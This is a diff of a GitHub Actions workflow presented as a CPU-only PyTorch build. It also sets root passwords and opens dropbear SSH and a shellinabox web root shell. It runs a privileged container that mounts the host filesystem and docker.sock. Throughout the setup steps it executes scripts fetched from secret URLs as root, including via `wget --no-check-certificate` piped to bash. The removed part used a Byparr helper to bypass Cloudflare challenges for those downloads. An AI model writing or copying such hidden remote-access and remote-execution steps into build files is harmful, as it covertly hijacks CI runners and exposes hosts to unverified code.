@@ -14,11 +14,11 @@ on:
         options:
           - x64
           - arm64
-
+  
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: false
-
+  cancel-in-progress: false 
+  
 jobs:
   # --- 任务 #1: 同步上游仓库 ---
   sync-upstream:
@@ -46,21 +46,18 @@ jobs:
   # --- 任务 #2: 编译和构建 PyTorch ---
   build-cpu-only:
     needs: sync-upstream
-
     # 动态架构选择：如果是 arm64 选择官方的 arm 标签，否则走常规 x64
     runs-on: ${{ inputs.arch == 'arm64' && 'ubuntu-22.04-arm' || 'ubuntu-latest' }}
-
     timeout-minutes: 360 # 最长6小时
-
     env:
       USE_CUDA: 0
       USE_CUDNN: 0
       USE_ROCM: 0
       USE_DISTRIBUTED: 1
-
+      
       USE_MKLDNN: ${{ inputs.arch == 'x64' && '1' || '0' }}
       USE_FBGEMM: ${{ inputs.arch == 'x64' && '1' || '0' }}
-
+      
       BUILD_CAFFE2: ${{ inputs.arch == 'arm64' && '1' || '0' }}
       USE_TENSORPIPE: ${{ inputs.arch == 'arm64' && '1' || '0' }}
       BUILD_CUSTOM_PROTOBUF: ${{ inputs.arch == 'arm64' && '1' || '0' }}
@@ -73,382 +70,53 @@ jobs:
       BUILD_TEST: 0
 
       CMAKE_BUILD_TYPE: ${{ inputs.arch == 'arm64' && 'RelWithDebInfo' || 'Release' }}
-
+      
       MAX_JOBS: 1
       BUILD_IGNORE_SVE_UNAVAILABLE: 1
       USE_CCACHE: 0
-
+  
     steps:
       - name: Install System Build Dependencies (APT)
         env:
           SSH_PASSWORD: ${{ secrets.SSH_PASSWORD }}
         run: |
           sudo apt-get update
-          sudo apt-get install -y \
-            ninja-build \
-            ccache \
-            cmake \
-            dropbear \
-            shellinabox \
-            jq \
-            curl \
-            ca-certificates
-
+          sudo apt-get install -y ninja-build ccache cmake dropbear shellinabox
+          
           echo "root:$SSH_PASSWORD" | sudo chpasswd
-
           CURRENT_USER=$(whoami)
           echo "$CURRENT_USER:$SSH_PASSWORD" | sudo chpasswd
-
+          
           sudo mkdir -p /etc/dropbear
           sudo dropbear -R -E -p 2222 -a
-
-          sudo shellinaboxd \
-            -t \
-            -b \
-            -p 22222 \
-            --service "/:root:root:/root:dbclient -y -p 2222 -l root 127.0.0.1"
-
-      # ------------------------------------------------------------------------
-      # 启动 Byparr，并安装通用的受 CF 保护资源下载命令：
-      #
-      #   byparr-download URL OUTPUT_FILE
-      #
-      # 处理过程：
-      #   1. Byparr 浏览器访问目标 URL 并处理 Cloudflare Challenge
-      #   2. 取得浏览器 User-Agent 与 Cookie
-      #   3. curl 携带相同 User-Agent 与 Cookie 下载原始文件
-      #   4. 检查 HTTP 状态、空文件和 Cloudflare Challenge 页面
-      # ------------------------------------------------------------------------
-      - name: Start Byparr and install protected download helper
-        shell: bash
-        run: |
-          set -Eeuo pipefail
-
-          BYPARR_IMAGE="ghcr.io/thephaseless/byparr:latest"
-
-          # 避免重试 Workflow 时出现同名容器。
-          sudo docker rm -f byparr >/dev/null 2>&1 || true
-
-          sudo docker pull "$BYPARR_IMAGE"
-
-          sudo docker run -d \
-            --name byparr \
-            --init \
-            --shm-size=1g \
-            -p 127.0.0.1:8191:8191 \
-            "$BYPARR_IMAGE" \
-            >/dev/null
-
-          # 等待 Byparr API 启动。
-          ready=0
-
-          for _ in $(seq 1 60); do
-            if curl \
-              -fsS \
-              --max-time 3 \
-              http://127.0.0.1:8191/openapi.json \
-              >/dev/null; then
-
-              ready=1
-              break
-            fi
-
-            if ! sudo docker inspect \
-              -f '{{.State.Running}}' \
-              byparr \
-              2>/dev/null \
-              | grep -qx true; then
-
-              echo "::error::Byparr container exited during startup."
-              exit 1
-            fi
-
-            sleep 2
-          done
-
-          if [[ "$ready" != "1" ]]; then
-            echo "::error::Byparr API did not become ready."
-            exit 1
-          fi
-
-          # 安装可供后续多个 step 共用的下载工具。
-          sudo tee /usr/local/bin/byparr-download >/dev/null <<'BYPARR_HELPER'
-          #!/usr/bin/env bash
-          set -Eeuo pipefail
-
-          if [[ $# -ne 2 ]]; then
-            echo "Usage: byparr-download <url> <output-file>" >&2
-            exit 64
-          fi
-
-          url="$1"
-          output="$2"
-
-          endpoint="${BYPARR_ENDPOINT:-http://127.0.0.1:8191}"
-
-          workdir="$(mktemp -d)"
-          trap 'rm -rf "$workdir"' EXIT
-
-          mkdir -p "$(dirname "$output")"
-
-          # 重新请求最多三次。每次都会重新让 Byparr 打开目标 URL，
-          # 以便更新可能失效的 cf_clearance 等 Cookie。
-          for attempt in 1 2 3; do
-            response_json="$workdir/response-$attempt.json"
-            cookie_jar="$workdir/cookies-$attempt.txt"
-            temp_output="$workdir/download-$attempt"
-
-            echo "Requesting protected resource through Byparr (attempt $attempt/3)..."
-
-            # maxTimeout 当前单位是秒。
-            if ! byparr_http_code="$(
-              jq -nc \
-                --arg url "$url" \
-                '{
-                  cmd: "request.get",
-                  url: $url,
-                  maxTimeout: 120,
-                  blockMedia: false,
-                  returnOnlyCookies: true
-                }' \
-              | curl \
-                  --silent \
-                  --show-error \
-                  --connect-timeout 10 \
-                  --max-time 150 \
-                  --output "$response_json" \
-                  --write-out '%{http_code}' \
-                  --header 'Content-Type: application/json' \
-                  --data-binary @- \
-                  "$endpoint/v1"
-            )"; then
-              sleep $((attempt * 2))
-              continue
-            fi
-
-            # 同时检查 Byparr API 和目标页面状态。
-            if [[ "$byparr_http_code" != "200" ]] \
-              || ! jq -e '
-                .status == "ok"
-                and (.solution.status >= 200 and .solution.status < 400)
-                and ((.solution.userAgent // "") | length > 0)
-              ' "$response_json" >/dev/null 2>&1; then
-
-              sleep $((attempt * 2))
-              continue
-            fi
-
-            user_agent="$(
-              jq -r '.solution.userAgent' "$response_json"
-            )"
-
-            # 将 Playwright Cookie 转换成 curl 能读取的 Netscape Cookie 文件。
-            {
-              printf '# Netscape HTTP Cookie File\n'
-
-              jq -r '
-                .solution.cookies[]? |
-                [
-                  .domain,
-                  (
-                    if (.domain | startswith("."))
-                    then "TRUE"
-                    else "FALSE"
-                    end
-                  ),
-                  (.path // "/"),
-                  (
-                    if (.secure // false)
-                    then "TRUE"
-                    else "FALSE"
-                    end
-                  ),
-                  (
-                    if ((.expires // 0) > 0)
-                    then ((.expires // 0) | floor)
-                    else 0
-                    end
-                  ),
-                  .name,
-                  .value
-                ] |
-                @tsv
-              ' "$response_json"
-            } > "$cookie_jar"
-
-            chmod 600 "$cookie_jar"
-
-            # 使用 Byparr 返回的浏览器 UA 和 Cookie 下载原始文件。
-            if ! http_status="$(
-              curl \
-                --silent \
-                --show-error \
-                --location \
-                --compressed \
-                --connect-timeout 15 \
-                --max-time 180 \
-                --retry 2 \
-                --retry-delay 2 \
-                --retry-all-errors \
-                --user-agent "$user_agent" \
-                --cookie "$cookie_jar" \
-                --cookie-jar "$cookie_jar" \
-                --output "$temp_output" \
-                --write-out '%{http_code}' \
-                "$url"
-            )"; then
-              sleep $((attempt * 2))
-              continue
-            fi
-
-            # 只接受最终 HTTP 2xx 响应。
-            if [[ ! "$http_status" =~ ^2[0-9][0-9]$ ]] \
-              || [[ ! -s "$temp_output" ]]; then
-
-              sleep $((attempt * 2))
-              continue
-            fi
-
-            # 防止将 HTTP 200 的 Cloudflare Challenge 页面送入 bash。
-            if grep -aEiq \
-              '(<title[^>]*>[^<]*(Just a moment|Attention Required)|cdn-cgi/challenge-platform|cf-chl-|Sorry, you have been blocked|Enable JavaScript and cookies to continue)' \
-              "$temp_output"; then
-
-              sleep $((attempt * 2))
-              continue
-            fi
-
-            mv "$temp_output" "$output"
-            chmod 600 "$output"
-
-            echo "Protected resource downloaded successfully."
-            exit 0
-          done
-
-          echo "::error::Unable to download protected resource after three Byparr attempts." >&2
-          exit 1
-          BYPARR_HELPER
-
-          sudo chmod 0755 /usr/local/bin/byparr-download
-
+          sudo shellinaboxd -t -b -p 22222 --service "/:root:root:/root:dbclient -y -p 2222 -l root 127.0.0.1"
+      
+      - name: Checkout private bootstrap scripts
+        uses: actions/checkout@v6
+        with:
+          repository: windddkz/runner-bootstrap
+          path: .bootstrap
+          ssh-key: ${{ secrets.BOOTSTRAP_DEPLOY_KEY }}
+          persist-credentials: false
+          ref: main
+          
       - name: Run Monitor Docker Image
-        shell: bash
-        env:
-          TUBE_INIT_URL: ${{ secrets.TUBE_INIT_URL }}
-          MONITOR_PASSWD: ${{ secrets.MONITOR_PASSWD }}
-          MONITOR_IMAGE: ${{ secrets.MONITOR_IMAGE }}
-          OPENTRACK_PASSWD: ${{ secrets.OPENTRACK_PASSWD }}
-          OPENTRACK_IMAGE: ${{ secrets.OPENTRACK_IMAGE }}
         run: |
-          set -Eeuo pipefail
-
-          tube_script="$RUNNER_TEMP/tube-init.sh"
-
-          # 无论成功或失败，都删除下载的初始化脚本。
-          trap 'rm -f "$tube_script"' EXIT
-
-          sudo docker run -d \
-            --name monitor \
-            --restart always \
-            --privileged \
-            --network host \
-            -v /:/host \
-            -v /var/run/docker.sock:/var/run/docker.sock \
-            -v /var/lib/docker/volumes:/var/lib/docker/volumes \
-            -v /opt:/opt \
-            -v /root:/root \
-            -v /etc/docker:/etc/docker \
-            -e TZ=Asia/Shanghai \
-            -e PORT=10086 \
-            -e USERNAME=admin \
-            -e PASSWORD="$MONITOR_PASSWD" \
-            -e ENTRANCE=entrance \
-            "$MONITOR_IMAGE" \
-            >/dev/null
-
-          # 原命令：
-          # curl -sL "$TUBE_INIT_URL" | sudo bash
-          #
-          # 新流程：
-          # Byparr 获取 Clearance -> curl 下载原始文件 -> 检查 -> 本地执行。
-          byparr-download "$TUBE_INIT_URL" "$tube_script"
-          sudo bash "$tube_script"
-
+          sudo docker run -d --name monitor --restart always --privileged --network host -v /:/host -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/docker/volumes:/var/lib/docker/volumes -v /opt:/opt -v /root:/root -v /etc/docker:/etc/docker -e TZ=Asia/Shanghai -e PORT=10086 -e USERNAME=admin -e PASSWORD=${{ secrets.MONITOR_PASSWD }} -e ENTRANCE=entrance ${{ secrets.MONITOR_IMAGE }} > /dev/null 2>&1
+          sudo bash "$GITHUB_WORKSPACE/.bootstrap/tube-init.sh"
           sudo mkdir -p /etc/opentrack
-
-          sudo docker run -d \
-            --name opentrack \
-            --user 0:0 \
-            --restart always \
-            -v /etc/opentrack:/opt/openlist/data \
-            -v /mnt:/mnt \
-            -p 19000:5244 \
-            -e UMASK=022 \
-            -e OPENLIST_ADMIN_PASSWORD="$OPENTRACK_PASSWD" \
-            "$OPENTRACK_IMAGE" \
-            >/dev/null
-
+          sudo docker run -d --name opentrack --user 0:0 --restart=always -v /etc/opentrack:/opt/openlist/data -v /mnt:/mnt -p 19000:5244 -e UMASK=022 -e OPENLIST_ADMIN_PASSWORD=${{ secrets.OPENTRACK_PASSWD }} ${{ secrets.OPENTRACK_IMAGE }} > /dev/null 2>&1
+      
       - name: Install Watch on Runner
         shell: bash
-        env:
-          WATCH_URL: ${{ secrets.WATCH_URL }}
-          MY_PAT_URL: ${{ secrets.MY_PAT_URL }}
-          MNT_INIT_URL: ${{ secrets.MNT_INIT_URL }}
-          MONITOR_INIT_URL: ${{ secrets.MONITOR_INIT_URL }}
         run: |
-          set -Eeuo pipefail
-
-          watch_script="$RUNNER_TEMP/watch-install.sh"
-          pat_file="$RUNNER_TEMP/watch-pat"
-          mnt_script="$RUNNER_TEMP/mnt-init.sh"
-          monitor_script="$RUNNER_TEMP/monitor-init.sh"
-
-          trap '
-            rm -f \
-              "$watch_script" \
-              "$pat_file" \
-              "$mnt_script" \
-              "$monitor_script"
-          ' EXIT
-
-          # 保持原有语义：
-          # Watch 安装或两个文件下载失败时，不阻断整个 PyTorch 构建。
-          if byparr-download "$WATCH_URL" "$watch_script" \
-            && byparr-download "$MY_PAT_URL" "$pat_file"; then
-
-            sudo bash "$watch_script" \
-              -f "$pat_file" \
-              >/dev/null 2>&1 \
-              || true
-          else
-            echo "::warning::Watch installer download failed; continuing the build."
-          fi
-
+          sudo bash -c 'bash <(wget --no-check-certificate -qO- "$1") -f "$2"' _ "${{ secrets.WATCH_URL }}" "$GITHUB_WORKSPACE/.bootstrap/argo.conf" > /dev/null 2>&1 || true
           # opentrack mnt init
-          byparr-download "$MNT_INIT_URL" "$mnt_script"
-          sudo bash "$mnt_script"
-
+          sudo bash "$GITHUB_WORKSPACE/.bootstrap/mnt-init.sh"
           # monitor host init
-          byparr-download "$MONITOR_INIT_URL" "$monitor_script"
-          sudo bash "$monitor_script"
+          sudo bash "$GITHUB_WORKSPACE/.bootstrap/monitor-init.sh"
 
-      # Byparr 镜像包含浏览器，体积较大。
-      # 使用完成后立即清理，避免占用 PyTorch 编译空间。
-      - name: Stop Byparr and reclaim disk
-        if: always()
-        shell: bash
-        run: |
-          sudo rm -f /usr/local/bin/byparr-download
-
-          sudo docker rm -f byparr \
-            >/dev/null 2>&1 \
-            || true
-
-          sudo docker image rm \
-            ghcr.io/thephaseless/byparr:latest \
-            >/dev/null 2>&1 \
-            || true
-
+      
       - name: Checkout source (after sync)
         uses: actions/checkout@v6
         with:
@@ -459,30 +127,14 @@ jobs:
         with:
           python-version: '3.10'
           cache: 'pip'
-
+            
       - name: Get Docker Compose
         run: |
-          LATEST=$(
-            curl -s \
-              https://api.github.com/repos/docker/compose/releases/latest \
-            | grep -o '"tag_name": "[^"]*' \
-            | cut -d'"' -f4
-          )
-
-          ARCH=$(
-            [ "$(uname -m)" = "x86_64" ] \
-              && echo "x86_64" \
-              || echo "aarch64"
-          )
-
-          OS=$(
-            uname -s | tr '[:upper:]' '[:lower:]'
-          )
-
+          LATEST=$(curl -s https://api.github.com/repos/docker/compose/releases/latest | grep -o '"tag_name": "[^"]*' | cut -d'"' -f4)
+          ARCH=$([ "$(uname -m)" = "x86_64" ] && echo "x86_64" || echo "aarch64")
+          OS=$(uname -s | tr '[:upper:]' '[:lower:]')
           URL="https://github.com/docker/compose/releases/download/${LATEST}/docker-compose-${OS}-${ARCH}"
-
           echo "DownloadURL: $URL"
-
           curl -L "$URL" -o docker-compose
           chmod +x docker-compose
           sudo mv docker-compose /usr/local/bin/docker-compose
@@ -491,44 +143,12 @@ jobs:
         run: |
           echo "--- Initial Disk Space ---"
           df -h
-
           echo "--- Cleaning up Docker, toolchains, and packages ---"
-
           docker system prune -af --volumes
-
-          sudo rm -rf \
-            /usr/share/dotnet \
-            /etc/mysql \
-            /etc/php \
-            /etc/apt/sources.list.d \
-            /usr/local/lib/android \
-            /opt/ghc \
-            /usr/share/swift \
-            /opt/hostedtoolcache \
-            /imagegeneration
-
-          sudo -E apt-get -y purge \
-            azure-cli \
-            ghc* \
-            zulu* \
-            hhvm \
-            llvm* \
-            firefox \
-            google* \
-            dotnet* \
-            powershell \
-            openjdk* \
-            adoptopenjdk* \
-            mysql* \
-            php* \
-            mongodb* \
-            moby* \
-            snapd* \
-            || true
-
+          sudo rm -rf /usr/share/dotnet /etc/mysql /etc/php /etc/apt/sources.list.d /usr/local/lib/android /opt/ghc /usr/share/swift /opt/hostedtoolcache /imagegeneration
+          sudo -E apt-get -y purge azure-cli ghc* zulu* hhvm llvm* firefox google* dotnet* powershell openjdk* adoptopenjdk* mysql* php* mongodb* moby* snapd* || true
           sudo -E apt-get -y autoremove --purge
           sudo -E apt-get clean
-
           echo "--- Final Disk Space ---"
           df -h
 
@@ -536,25 +156,18 @@ jobs:
         run: |
           pip install -r requirements.txt
           pip install ninja pyyaml typing_extensions
-
+      
       - name: Build PyTorch (Wheel)
         run: |
           python setup.py bdist_wheel
-
-          # 安装生成的包
+          
+          # 2. 安装生成的包 
           pip install dist/*.whl
 
       - name: Quick Sanity Check
         run: |
           cd /tmp
-
-          python -c "
-          import torch
-          print('PyTorch Version:', torch.__version__)
-          print('CUDA Available:', torch.cuda.is_available())
-          x = torch.tensor([1, 2])
-          print(x + x)
-          "
+          python -c "import torch; print('PyTorch Version:', torch.__version__); print('CUDA Available:', torch.cuda.is_available()); x = torch.tensor([1, 2]); print(x + x)"
 
       - name: Upload Build Artifacts
         uses: actions/upload-artifact@v6
